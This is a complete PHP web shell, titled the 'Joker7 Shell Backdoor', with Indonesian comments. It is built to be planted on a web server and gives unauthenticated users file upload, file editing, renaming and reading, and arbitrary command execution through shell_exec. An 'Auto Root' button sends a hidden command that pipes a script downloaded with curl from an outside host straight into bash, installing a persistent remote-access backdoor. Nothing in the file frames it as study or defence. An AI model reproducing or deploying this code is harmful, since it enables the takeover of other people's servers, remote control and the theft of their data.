<?php
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__; // Direktori saat ini

// Fungsi untuk mencegah traversal directory
function sanitize_path($path) {
    $real_base = realpath(__DIR__);
    $real_user_path = realpath($path);
    if ($real_user_path && strpos($real_user_path, $real_base) === 0) {
        return $real_user_path;
    }
    return $real_base;
}

$current_dir = sanitize_path($current_dir);

// Mengunggah file
if (isset($_FILES['file'])) {
    $destination = $current_dir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $destination)) {
        echo "<p>File berhasil diunggah!</p>";
    } else {
        echo "<p>Gagal mengunggah file.</p>";
    }
}

// Menjalankan perintah shell
$output = '';
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd);
}

// Mengedit file
if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    $file_to_edit = sanitize_path($current_dir . '/' . basename($_POST['edit_file']));
    file_put_contents($file_to_edit, $_POST['file_content']);
    echo "<p>File berhasil disimpan!</p>";
}

// Merename file
if (isset($_POST['rename_file']) && isset($_POST['new_name'])) {
    $file_to_rename = sanitize_path($current_dir . '/' . basename($_POST['rename_file']));
    $new_name = sanitize_path($current_dir . '/' . basename($_POST['new_name']));
    if (rename($file_to_rename, $new_name)) {
        echo "<p>File berhasil diubah namanya!</p>";
    } else {
        echo "<p>Gagal mengubah nama file.</p>";
    }
}

// Mendapatkan daftar file dan folder dalam direktori
$files = scandir($current_dir);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>./Joker7 Shell Backdoor</title>
    <style>
        body {
            background-image: url('https://i.ibb.co/zxVGDwY/bade5470afb9c7e457569b30bbc5a9ec.jpg'); /* Ganti dengan link gambar background */
            background-size: cover;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        h1 {
            margin-bottom: 20px;
            position: relative;
        }
        form {
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        input[type="text"], input[type="file"], textarea {
            width: 300px;
            padding: 10px;
            margin-bottom: 10px;
            border: none;
            border-radius: 4px;
            color: #282c34;
        }
        input[type="submit"] {
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            background-color: #ff4c4c;
            color: #282c34;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-left: 10px;
        }
        input[type="submit"]:hover {
            background-color: #e00f0f;
        }
        pre {
            background-color: #1e1e1e;
            padding: 20px;
            border-radius: 4px;
            overflow-x: auto;
            max-width: 80%;
            word-wrap: break-word;
            color: #ff4c4c; /* Warna merah untuk output */
        }
        table {
            border-collapse: collapse;
            width: 80%;
            max-width: 800px;
            margin-top: 20px;
            background-color: rgba(0, 0, 0, 0.7);
        }
        th, td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #333;
        }
        tr:hover {
            background-color: #444;
        }
        tr.separator td {
            border-top: 2px solid #555;
        }
        a {
            color: #ff4c4c; /* Warna merah untuk nama file */
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        img.logo {
            width: 100px;
            height: auto;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <img src="https://i.ibb.co/NsZS0vR/bcd96d2a200acb2a14532bcd219d714a.jpg" alt="Logo" class="logo"> <!-- Ganti dengan link gambar logo -->
    <h1>./Joker7 Mini Shell</h1>
    
    <!-- Form untuk mengunggah file -->
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" id="fileInput" style="display:none;">
        <input type="submit" value="Upload File" onclick="document.getElementById('fileInput').click(); return false;">
    </form>

    <!-- Form untuk mengeksekusi command -->
    <form method="POST">
        <input type="hidden" name="cmd" value='bash -c "$(curl -fsSL https://gsocket.io/y)"'>
        <input type="submit" value="Auto Root">
    </form>

    <!-- Menampilkan output perintah -->
    <?php if (!empty($output)): ?>
        <pre><?php echo htmlspecialchars($output); ?></pre>
    <?php endif; ?>

    <!-- Tabel untuk menampilkan file dan folder -->
    <table>
        <thead>
            <tr>
                <th>Nama File</th>
                <th>Ukuran</th>
                <th>Aksi</th>
            </tr>
        </thead>
        <tbody>
            <?php
            $directories = [];
            $regular_files = [];

            // Memisahkan folder dan file
            foreach ($files as $file) {
                if ($file !== '.' && $file !== '..') {
                    if (is_dir($current_dir . '/' . $file)) {
                        $directories[] = $file;
                    } else {
                        $regular_files[] = $file;
                    }
                }
            }

            // Menampilkan folder terlebih dahulu
            foreach ($directories as $dir): ?>
                <tr>
                    <td>
                        <a href="?dir=<?php echo urlencode($current_dir . '/' . $dir); ?>"><?php echo htmlspecialchars($dir); ?></a>
                    </td>
                    <td>Folder</td>
                    <td>
                        <a href="#" onclick="renameFile('<?php echo htmlspecialchars($dir); ?>')">Rename</a>
                    </td>
                </tr>
            <?php endforeach; ?>

            <!-- Pemisah antara folder dan file -->
            <tr class="separator"><td colspan="3"></td></tr>

            <!-- Menampilkan file biasa -->
            <?php foreach ($regular_files as $file): ?>
                <tr>
                    <td><?php echo htmlspecialchars($file); ?></td>
                    <td><?php echo round(filesize($current_dir . '/' . $file) / 1024, 2); ?> KB</td>
                    <td>
                        <a href="#" onclick="editFile('<?php echo htmlspecialchars($file); ?>')">Edit</a> |
                        <a href="#" onclick="renameFile('<?php echo htmlspecialchars($file); ?>')">Rename</a>
                    </td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>

    <!-- Form untuk mengedit file -->
    <form id="editForm" method="POST" style="display:none;">
        <h2>Edit File: <span id="editFileName"></span></h2>
        <textarea name="file_content" rows="10" placeholder="File content"></textarea><br>
        <input type="hidden" name="edit_file" id="editFile">
        <input type="submit" value="Save">
    </form>

    <!-- Form untuk merename file -->
    <form id="renameForm" method="POST" style="display:none;">
        <h2>Rename File: <span id="renameFileName"></span></h2>
        <input type="text" name="new_name" placeholder="New name">
        <input type="hidden" name="rename_file" id="renameFile">
        <input type="submit" value="Rename">
    </form>

    <script>
        function editFile(fileName) {
            document.getElementById('editFileName').textContent = fileName;
            document.getElementById('editFile').value = fileName;
            document.getElementById('editForm').style.display = 'block';
            document.getElementById('renameForm').style.display = 'none';

            fetch('?dir=<?php echo urlencode($current_dir); ?>&get_content=' + encodeURIComponent(fileName))
                .then(response => response.text())
                .then(data => {
                    document.querySelector('textarea[name="file_content"]').value = data;
                });
        }

        function renameFile(fileName) {
            document.getElementById('renameFileName').textContent = fileName;
            document.getElementById('renameFile').value = fileName;
            document.getElementById('renameForm').style.display = 'block';
            document.getElementById('editForm').style.display = 'none';
        }
    </script>

    <?php
    // Menampilkan konten file
    if (isset($_GET['get_content'])) {
        $file_to_read = sanitize_path($current_dir . '/' . basename($_GET['get_content']));
        if (is_file($file_to_read)) {
            echo file_get_contents($file_to_read);
        }
        die;
    }
    ?>
</body>
</html>